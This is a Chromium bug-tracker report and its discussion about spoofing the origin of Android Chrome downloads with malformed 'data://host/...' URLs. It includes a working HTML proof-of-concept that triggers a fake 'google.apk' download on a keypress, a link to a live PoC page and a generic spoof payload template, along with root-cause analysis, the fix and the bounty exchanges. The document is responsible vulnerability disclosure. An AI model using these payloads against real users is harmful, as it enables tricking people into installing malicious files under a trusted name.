# Download origin spoofing using malformed data url.

| Field | Value |
|-------|-------|
| **Issue ID** | [421511847](https://issues.chromium.org/issues/421511847) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Browser>Downloads |
| **Platforms** | Android |
| **Chrome Version** | 136.0.7103.127 |
| **Reporter** | x4...@gmail.com |
| **Assignee** | ch...@chromium.org |
| **Created** | 2025-05-31 |
| **Bounty** | $5,000.00 |

## Description

# Steps to reproduce the problem

1. Enter this payload in the address bar on android chrome: `data://google.com/html,somereallyreallylongtextattheaddressbar` and press enter, you will notice a download begins with origin in the notification as google.com, same origin is displayed in chrome://downloads menu too.

Full potential exploitation of this vulnerability: Download an apk from google.com as spoofed origin:
Live POC: <https://gojo-satorou-v7.github.io/chigorin/>

Host below code:

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download & Fullscreen on Keypress</title>
</head>
<body>
  <center><h2>POC by Chigorin!</h2></center>

  <script>
    // Listen to any keydown
    window.addEventListener('keydown', function(e) {
      // open the download
      openWin();
      // request fullscreen
      //goFullScreen();
    });

    // Download helper
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    // Kick off your “APK” download
    function openWin() {
      Puf(
        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
        "google.apk"
      );
    }

  </script>
  

  
</body>
</html>


```

Press space [since I am on emulator]
Notice an apk will be downloaded from google.com

# Problem Description

## Root cause analysis:

### Let's go step by step:

1. Why is the above payload triggering a download?

Because of this code.

```
    bool is_download;
    bool must_download =
        download_utils::MustDownload(url_, head.headers.get(), head.mime_type);
    bool known_mime_type = blink::IsSupportedMimeType(head.mime_type);
#if BUILDFLAG(ENABLE_PLUGINS)
    if (!head.intercepted_by_plugin && !must_download && !known_mime_type) {
      // No plugin throttles intercepted the response. Ask if the plugin
      // registered to PluginService wants to handle the request.
      CheckPluginAndContinueOnReceiveResponse(
          head, std::move(url_loader_client_endpoints),
          true /* is_download_if_not_handled_by_plugin */,
          std::vector<WebPluginInfo>());
      return;
    }

```

<https://github.com/chromium/chromium/blob/23df03bf4570c5b17d918be5daf785d60ba0707b/content/browser/loader/navigation_url_loader_impl.cc#L1178>

The format of a data uri is as follows: data:[<mime-type>][;base64],<data> and according to above code if the mime type is unknown it will trigger a download.

2. Chromium’s GURL sees the scheme data and, because of the //, treats google.com as a host. Then url.GetContent() returns the substring after the scheme (which in this case includes the path /html,sometext). DataURL::Parse() splits at the first comma: the part before the comma is interpreted as “media type” metadata, and the part after as the raw data. In our example:
   
   Content before comma = "google.com/html" (misinterpreted as MIME/media type)
   
   Content after comma = "sometext" (the actual payload)

Because "google.com/html" is not a valid MIME type, the parser falls back to defaults.

### So now we know why the malformed data url is causing a download, next I will show you why is the download notification taking google.com as origin (seems obvious now, GURL is the culprit!)

3. How does the download notification handling the data uri?

In the in-app download notification (via DownloadMessageUiControllerImpl), the code calls DownloadUtils.formatUrlForDisplayInNotification with the download’s URL. That method (in components/browser\_ui/util/android/DownloadUtils.java) does:

```
if (GURL.isEmptyOrInvalid(url)) return null;
String formattedUrl = UrlFormatter.formatUrlForSecurityDisplay(
    url, UrlFormatter.SchemeDisplay.OMIT_HTTP_AND_HTTPS);
if (formattedUrl.length() <= MAX_ORIGIN_LENGTH) return formattedUrl;
// Too long – strip to eTLD+1
return UrlUtilities.getDomainAndRegistry(url.getSpec(), false);


```

For a malformed data URL like data://google.com/html,sometext, UrlFormatter.formatUrlForSecurityDisplay(url) will include the scheme and full URL by default (since the scheme is “data”, not HTTP/HTTPS, it is not omitted). The string "data://google.com/html,sometext" exceeds the MAX\_ORIGIN\_LENGTH (25 chars), so the code falls back to UrlUtilities.getDomainAndRegistry(url.getSpec()), which extracts the effective top-level domain+1 from the full URL string. In this case it returns "google.com". That string is then shown as the “origin” in the notification.

# Additional Comments

Oldest version in which this POC works: 130.0.5723.40 Stable works till current latest version of 136.0.7103.127

Please note: I was only able to get the above version apk of chrome from a third party website, although I am highly confident that the vulnerability started existing after the release of 130.x.x.x
Oldest version in which this vulnerability doesn't work: 129.x.x.x

# Summary

Download origin spoofing using malformed data url.

# Additional Data

Category: Security   

Chrome Channel: Stable   

Regression: No

## Attachments

- [not-working-version-129.mp4](attachments/not-working-version-129.mp4) (video/mp4, 5.3 MB)
- [oldest-working-version.mp4](attachments/oldest-working-version.mp4) (video/mp4, 18.6 MB)
- [POC.mp4](attachments/POC.mp4) (video/mp4, 7.7 MB)
- [POC updated.mp4](attachments/POC updated.mp4) (video/mp4, 3.1 MB)

## Timeline

### nh...@chromium.org (2025-06-02)

chlily: this looks similar to [crbug.com/419922504](https://crbug.com/419922504), but the structure of the `data:` URL looks different enough that I think it's a different root cause. To repro on an actual device, I needed to add `<input type="text"></input>` to the poc after the `</script>` tag so that I could tap in the text box to get the on-screen keyboard to appear allowing me to generate a keydown event.

### ch...@google.com (2025-06-03)

Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### x4...@gmail.com (2025-06-03)

I've updated the live POC url and now it's perfect attack scenario.

Live POC: <https://gojo-satorou-v7.github.io/chigorin/>

Also I think this commit might have been the cause for this vulnerability: <https://github.com/chromium/chromium/commit/6c1a0cec38d714f2c82c9bdb319409c597781acd>

The download notification shows the payload `data://google.com/html,hi` instead of `google.com` if the characters are less than 40 (in this case) and if they're less than 25 it shows the payload in chrome://downloads (downloads menu) which were both introduced in this commit and several download UI changes were also made.

## Suggested Mitigations:

We cannot restrict the download of malformed data uri because of whatwg and some rfc restrictions [rfc 2045] explicitly mentioning that a malformed url should fallback to text/plain. what we can do instead is check for authority in the data uri and make is\_download=false if it detects any host.

```
--- a/content/browser/loader/navigation_url_loader_impl.cc
+++ b/content/browser/loader/navigation_url_loader_impl.cc
@@ -1096,7 +1096,19 @@ void NavigationURLLoaderImpl::OnReceiveResponse(
   head.headers->parsed = std::move(network_head);

-  bool is_download = !head.intercepted_by_plugin && (must_download || !known_mime_type);
+  // ------------------- PATCH START -------------------
+  bool is_download = false;
+  if (url_.SchemeIs(url::kDataScheme)) {
+    // Only suppress download if DataURL::Parse() had to fall back to "text/plain"
+    // AND there was a bogus host (authority) present.
+    bool fallback_plain = head.mime_type == "text/plain";
+    bool had_authority  = url_.has_host();
+    if (fallback_plain && had_authority) {
+      // Malformed data:// URL → always render inline
+      is_download = false;
+    } else {
+      // Well-formed data:(<type>/<subtype>,...) → use normal logic.
+      is_download = !head.intercepted_by_plugin && (must_download || !known_mime_type);
+    }
+  } else {
+    // Non-data schemes keep original behavior
+    is_download = !head.intercepted_by_plugin && (must_download || !known_mime_type);
+  }
+  // -------------------- PATCH END --------------------

   CallOnReceivedResponse(std::move(head), std::move(endpoints), is_download);
 }


```

### x4...@gmail.com (2025-06-09)

Hello, according to this report and comment I believe this should be also S1 severity since the attacker has full control over the download url and downloaded content: <https://issues.chromium.org/issues/40055527#comment32>

Thanks,
Abhishek.

### x4...@gmail.com (2025-06-17)

Embargo notice: Since this affects multiple browsers including firefox, please do not disclose this without prior notice.

### x4...@gmail.com (2025-06-25)

Any updates?

### ch...@chromium.org (2025-07-01)

To be consistent with what Chrome displays on desktop (chrome://downloads), I think the right thing to do here is to avoid showing the download URL at all (the data: URL in this case).

In desktop downloads UI, we had previously decided to show "where the download came from" (which may be more meaningful to the user) as opposed to the final download URL, which could be an unintelligible CDN URL, or some URL after many redirects on an origin that the user had never navigated to or even heard of. In [crbug.com/40280033](https://crbug.com/40280033) we implemented the display of "where the download came from" as the referrer URL iff HasUserGesture. Subsequently there were some issues uncovered about this, and I think we could do better at displaying "where the download came from" if we switched to the initiator origin rather than the referrer URL.

I am planning to improve this for desktop downloads ([crbug.com/424764882](https://crbug.com/424764882)). And I think the right thing for Chrome on Android is to be consistent.

To do this for the Android downloads UI, there would be some plumbing involved to get the initiator origin from download::DownloadItem into DownloadInfo and OfflineItem on the java side.

### ch...@chromium.org (2025-07-01)

cc some Clank downloads folks as fyi

### am...@chromium.org (2025-07-01)

cc'ing some folks from Mozilla who have asked for visibility of this issue also reported to them

### x4...@gmail.com (2025-07-02)

> I think the right thing to do here is to avoid showing the download URL at all (the data: URL in this case).

Note: While this solution works, it would still be a problem in other browsers using chromium. For example chromium on windows is unaffected by this vulnerability but affects Arc browser, Yandex browser and probably more browsers too.

I would recommend disabling a download on visiting malformed data url. The faulty code is mentioned in the report.

### x4...@gmail.com (2025-07-02)

Unrelated to this report: Could you please give me an asan enabled chromium apk for android (x86), I've identified a crash but I'm unable to confirm if it's memory related vulnerability because my build fails to install on android.

I've searched LUCI and chromium snapshots too but there's no asan built for android.

### ch...@chromium.org (2025-07-02)

Hmm, I am not an expert in data: URLs, but my understanding was that the URLs in question here aren't "malformed" per se, as in they are semantically valid URLs from which data can correctly be downloaded. So it's correct to allow a download from this type of URL. It's just the format that is misleading (having a host-looking substring) which causes the code that parses it for UX display purposes to trip up and think that the data: URL has a host that it doesn't.

So one narrow fix would be to correct the mis-parse by not calling getDomainAndRegistry when we know the URL is a data: URL. (Maybe I will also do that. As you pointed out, that might help other Chromium embedders who still want to show the download URL.)

But I think the right thing overall would be to avoid showing the download URL in this UI.

### ch...@chromium.org (2025-07-03)

Uhh... hm. The more I stare at this, the less certain I am that GURL itself is doing the right thing with these data: URLs.

+cc csharrison from //url/OWNERS to ask: is GURL correct in treating "data://text/plain;base64,abcdef123?a3=a4#a5" as having a host of "text" and a path of "/plain;base64,abcdef123"?

With only one leading slash character after the scheme, "data:/text/plain;base64,abcdef123?a3=a4#a5" is treated as having no host, and having a path of "/text/plain;base64,abcdef123", which seems ok.

Of course, a more normal-looking data: URL without leading slashes, "data:text/plain;base64,abcdef123?a3=a4#a5" is treated as having no host, and having a path of "text/plain;base64,abcdef123", which seems correct.

The syntax in <https://www.rfc-editor.org/rfc/rfc2397.txt> doesn't seem to accept stuff like "data://text/plain;base64,abcdef123" because the "type" from RFC2045 must be on a pretty short list of tokens and can't start with a leading slash.

I'm going to fix the Android UI function, but the misleading behavior can be traced to GURL's behavior here, which is at the very least a footgun.

### cs...@chromium.org (2025-07-03)

Hi Lily, the best resource for this will be the https://jsdom.github.io/whatwg-url tool which captures the browser's parser, as well as a JS implementation of the whatwg URL spec. In all the cases you mention, it seems we are compliant with that spec at least. If there are disagreements between specifications typically I think we have been airing towards aligning on the whatwg spec for interop (URL has been a focus of interop efforts in 2023/2024 iirc).

### dx...@google.com (2025-07-07)

Project: chromium/src  

Branch: main  

Author: Lily Chen [chlily@chromium.org](mailto:chlily@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6701188>

Android downloads UI: Only parse URL for eTLD+1 if it has a host

---


Expand for full commit details
```
     
    This CL fixes a helper function used in downloads UI on Android, which 
    formats a URL for display in the Download Home list, download completion 
    message, and download notification. Previously, the function would fall 
    back to an eTLD+1 from getDomainAndRegistry() if the formatted URL was 
    too long for the display surface. This is subtly incorrect for URLs 
    without a host (e.g. certain URL schemes), and can result in misleading 
    UI strings displayed to the user. 
     
    In this CL, we add a check that the origin has a host, and we omit the 
    URL/domain from the UI display if we cannot get a suitable formatted 
    URL/eTLD+1. 
     
    Screenshots: 
    https://drive.google.com/drive/folders/1M7lElUPRMstiM_zfgzsYVU8x0PQQMdD- 
     
    Bug: 421511847 
    Change-Id: Id4e48441d30427a6d73ab74f69caf6a778c49a99 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6701188 
    Reviewed-by: Theresa Sullivan <twellington@chromium.org> 
    Commit-Queue: Lily Chen <chlily@chromium.org> 
    Reviewed-by: Xinghui Lu <xinghuilu@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1483331}

```

---

Files:

- M `chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/DownloadMessageUiControllerImpl.java`
- M `chrome/browser/download/internal/android/java/src/org/chromium/chrome/browser/download/home/list/UiUtils.java`
- M `components/browser_ui/util/android/java/src/org/chromium/components/browser_ui/util/DownloadUtils.java`

---

Hash: 81de6a2b6cee7bce14a1586def1d782d9c16e618  

Date:  Mon Jul 7 20:16:21 2025


---

### ch...@chromium.org (2025-07-08)

> the best resource for this will be the <https://jsdom.github.io/whatwg-url> tool which captures the browser's parser, as well as a JS implementation of the whatwg URL spec. In all the cases you mention, it seems we are compliant with that spec at least

Thank you for sharing the link to this tool! It does seem that GURL complies with the spec according to this tool, so I think the CL in [comment #16](https://issues.chromium.org/issues/421511847#comment16) is sufficient to call this particular issue fixed. (I'll track the work mentioned in [comment #8](https://issues.chromium.org/issues/421511847#comment8) -- consistently showing "where the download came from" across all the UI surfaces -- as a separate issue.)

(My confusion in [comment #14](https://issues.chromium.org/issues/421511847#comment14) stemmed from the parsing of "text" as the host of the data: URL when there isn't any network connection ever made to a host called "text". I would've thought that data should conceptually be a "SCHEME\_WITHOUT\_AUTHORITY" but Chromium does not treat it as such. Though I see now that the whatwg URL spec allows for a host to be an "opaque identifier in URLs where a network address is not necessary".)

### x4...@gmail.com (2025-07-09)

Asking for re-evalution in severity. Similar reports: <https://issues.chromium.org/issues/40055527>

Also if possible please help with [comment #12](https://issues.chromium.org/issues/421511847#comment12)

### x4...@gmail.com (2025-07-21)

Any updates on bounty decision, it's been fairly long.

### am...@chromium.org (2025-07-21)

VRP rewards have have are decided in the order of severity. We have not gotten to this one at a VRP panel session as of yet. There have been some weeks lately we have not been able to have a VRP panel session due to holidays or folks on the panel being on vacation. This issue will be evaluated at a VRP panel session within the coming weeks. Once this issue has been able to be assessed and a reward decision has been made, the outcome will be provided here. We appreciate you patience in the meantime.

### sp...@google.com (2025-07-24)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
report of moderate impact security UI / origin information spoof 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-07-24)

Apologies for the noise. I accidentally updated the metadata in the wrong issue momentarily. I've since reset it to the original fields.

### am...@chromium.org (2025-07-24)

Congratulations reporter! Based on the updated POC and information in c#4, we deemed this to be moderately impactful and a high quality report. Thank you for your efforts and reporting this issue to us!

### x4...@gmail.com (2025-07-29)

Appeal reward reason: Hello, my current report was set the severity of medium however I believe it is an incorrect assessment and should be a high severity vulnerability instead.

This was also mentioned in comment 32 of <https://issues.chromium.org/issues/40055527#comment32>
Which is almost an exact replica of this vuln class.

Which I quote "retroactively boosting severity to High to help inform future sherriffing and other security impact decisions"

And if we talk about that report the origin was displayed in downloads menu which presented even greater hurdle and friction for a victim to trust to go in menu and then see the origin and then open the downloaded file. However in my report when a download was triggered a notification immediately popped up showing the spoofed origin which makes it even more convincing for the victim to click on the file and then downloads menu made it obvious.

The payload `data://[spoofed-address]/[foobar],[payload]` allowed to spoof any address with any file type and with any payload.

That is my rationale for this to be considered a high severity vuln.

### x4...@gmail.com (2025-07-31)

Hi, also I had included the bisect information in the initial report so do consider it in appeal reason.

### x4...@gmail.com (2025-08-29)

Any updates @amy\_re? It's been a month since the appeal.

### wf...@chromium.org (2025-09-09)

Thank you for your reassessment request, this will be looked at during a future panel.

### wf...@chromium.org (2025-09-10)

The panel performed a full reassessment of this issue at today's panel and it was decided that the reward of $5000 is appropriate here.

### x4...@gmail.com (2025-10-03)

Hello, in case you're going to credit this report. Please use the name `Abhishek Kumar`

### x4...@gmail.com (2025-10-03)

This research was done during my pre-final year. I’m still learning about chromium security and I would greatly appreciate any feedback about my report. Please feel free to share your feedback or any question at [chigorin.1337@gmail.com](mailto:chigorin.1337@gmail.com)

### ch...@google.com (2025-10-15)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/421511847)*
